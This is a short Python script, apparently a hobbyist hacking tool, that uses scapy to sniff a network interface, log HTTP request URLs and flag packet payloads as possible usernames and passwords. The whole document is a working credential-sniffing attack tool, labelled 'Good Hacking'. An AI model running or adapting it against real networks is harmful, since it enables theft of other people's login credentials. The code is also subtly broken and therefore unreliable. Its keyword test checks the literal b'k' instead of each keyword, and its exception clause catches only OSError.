import optparse
import scapy.all as scapy
from scapy.all import Raw
from colorama import init, Fore
from scapy.layers import http


#initialize colorama

init()

#define color

BLUE = Fore.BLUE
RESET = Fore.RESET
RED = Fore.RED
GREEN = Fore.GREEN
 
def get_args():
 
    parser = optparse.OptionParser(description="Good Hacking")
    parser.add_option("-i", "--interface", help="Set Which Network interface To scan Exp:eth0,wlan0... try ifconfig or ipconfig for windows maschine ")
    (options, argument) = parser.parse_args()
    if not options.interface:
        parser.error("Type -h for more help info")    
    else:
        return options


def sniff(iface):
    scapy.sniff(iface=iface, store=False, prn=process_sniff_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def login_info(packet):
    if packet.haslayer(Raw):
           load= packet[Raw].load
           keywords = ["username", "user", "login", "password", "pass"]
           for k in keywords:
               if b'k' in load:
                   return load


def process_sniff_packet(packet):
   if packet.haslayer(http.HTTPRequest):
       url = get_url(packet)
       print(f"{BLUE}[+] HTTP Request => ", url)
       
       login = login_info(packet)
       if login:
           print(f"{RED}\n\n[+] Possible Login => (" + str(login) + ")\n\n")

option = get_args()

try:
    sniff(option.interface)
except AttributeError and OSError:
    print(f"{RED}Verify your Network interface or Try -h For More Help!! {GREEN}Good Hacking")
